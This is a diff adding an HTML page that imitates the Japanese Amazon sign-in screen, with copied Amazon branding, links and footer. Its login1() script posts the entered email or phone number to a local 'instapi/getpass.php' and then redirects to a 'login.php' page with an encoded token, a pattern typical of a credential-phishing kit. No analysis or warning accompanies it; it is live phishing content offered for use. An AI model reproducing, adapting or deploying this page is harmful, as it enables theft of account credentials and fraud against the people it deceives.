@@ -1,0 +1,137 @@
+<html><head>
+    <meta charset="utf-8">
+    <title dir="ltr">Amazonサインイン</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <link rel="shortcut icon" href="static/img/icon.png">
+    <link rel="stylesheet" href="static/css/style.css">
+    <link rel="stylesheet" href="static/css/common.css">
+    <link rel="stylesheet" href="static/css/login.css">
+    <script src="static/js/jquery.min.js"></script>
+</head>
+
+<body>
+<div id="a-page">
+    <div class="a-section body-content">
+        <div class="a-section a-spacing-medium a-text-center">
+            <a class="a-link-nav-icon" tabindex="-1" href="https://www.amazon.co.jp/ref=ap_frn_logo">
+                <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
+                <i class="a-icon a-icon-jp a-icon-domain-jp a-icon-domain" role="img"></i>
+            </a>
+        </div>
+        <div class="a-section login_div1">
+            <div class="a-section auth-pagelet-container">
+                <form name="signineml" method="post" id="signineml" action="" class="" required="">
+                    <div class="a-section">
+                        <div class="a-box">
+                            <div class="a-box-inner a-padding-extra-large">
+                                <h1 class="a-spacing-small">ログイン</h1>
+                                <div class="a-row a-spacing-base">
+                                    <label for="ap_email" class="a-form-label">Eメールまたは携帯電話番号</label>
+                                    <input type="text" value="" maxlength="128" id="ap_email" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
+                                    <span class="error hide" id="emailerror">* Please enter your email or mobile phone number.</span>
+                                </div>
+                                <div class="a-section">
+                                        <span id="continue" class="a-button a-button-span12 a-button-primary">
+                                            <span class="a-button-inner">
+                                                <!-- <input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce"> -->
+                                                <span id="continue-announce" onclick="login1()" class="a-button-text" aria-hidden="true">次へ進む</span>
+                                            </span>
+                                        </span>
+                                    <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
+                                        続行することで、 Amazonの<a href="https://www.amazon.co.jp/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=643006">利用規約</a>および<a href="https://www.amazon.co.jp/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=643000">プライバシー規約</a>に同意するものとみなされます。
+                                    </div>
+                                </div>
+                                <div class="a-section">
+                                    <div aria-live="polite" class="a-row a-expander-container a-expander-inline-container">
+                                        <a href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header
+                                                   a-link-expander"><i class="a-icon a-icon-expand"></i>
+                                            <span class="a-expander-prompt">お困りですか?</span>
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+                <div class="a-divider a-divider-break">
+                    <h5>Amazonの新しいお客様ですか？</h5>
+                </div>
+                <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base">
+                        <span class="a-button-inner">
+                            <a id="createAccountSubmit" tabindex="6" href="https://www.amazon.co.jp/ap/register?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=jpflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fref%3Dnav_em_hd_re_signin&amp;prevRID=95YJHC51TTZ9XPG0XS1H&amp;openid.assoc_handle=jpflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;ref_=nav_em_hd_clc_signin&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" class="a-button-text" role="button">
+                                Amazonアカウントを作成
+                            </a>
+                        </span>
+                    </span>
+            </div>
+
+        </div>
+    </div>
+    <div id="right-2"></div>
+    <div class="a-section a-spacing-top-extra-large auth-footer">
+        <div class="a-divider a-divider-section">
+            <div class="a-divider-inner"></div>
+        </div>
+
+        <div class="a-section a-spacing-small a-text-center a-size-mini">
+            <span class="auth-footer-seperator"></span>
+            <a class="a-link-normal" target="_blank" href="https://www.amazon.co.jp/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=643006">
+                利用規約
+            </a>
+            <span class="auth-footer-seperator"></span>
+            <a class="a-link-normal" target="_blank" href="https://www.amazon.co.jp/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=643000">
+                プライバシー規約
+            </a>
+            <span class="auth-footer-seperator"></span>
+            <a class="a-link-normal" target="_blank" href="https://www.amazon.co.jp/help">
+                ヘルプ
+            </a>
+            <span class="auth-footer-seperator"></span>
+        </div>
+        <div class="a-section a-spacing-none a-text-center">
+                <span class="a-size-mini a-color-secondary">
+                    © 1996-2022, Amazon.com, Inc. or its affiliates
+                </span>
+        </div>
+    </div>
+</div>
+
+
+
+
+<script>
+    // var timestamp = Date.parse(new Date());
+    // var str = "hellbsbfdvdfvfffsffffffo";
+    // var str64 = window.btoa(str+timestamp);
+    // console.log("字符串是:"+str);
+    // console.log("经base64编码后:"+str64);
+    // console.log("base64解码后:"+window.atob(str64));
+    function login1(){
+        var email = $("#ap_email").val();
+        if(email == ''){
+            $("#ap_email").focus();
+            $("#emailerror").removeClass('hide')
+            return;
+        }
+        var timestamp = Date.parse(new Date());
+        var str64 = window.btoa("login="+timestamp);
+        $.ajax({
+            url: "instapi/getpass.php" ,//url
+            type:"post",
+            data: {
+                email: email
+            },
+            success: function (result) {
+                setTimeout(function() {
+                    $(location).attr("href", "login.php?pc="+str64+"https://www.amazon.co.jp")
+                }, 1000)
+            },
+            error : function() {
+                alert("异常！");
+            }
+        });
+    }
+</script>
+</body></html>
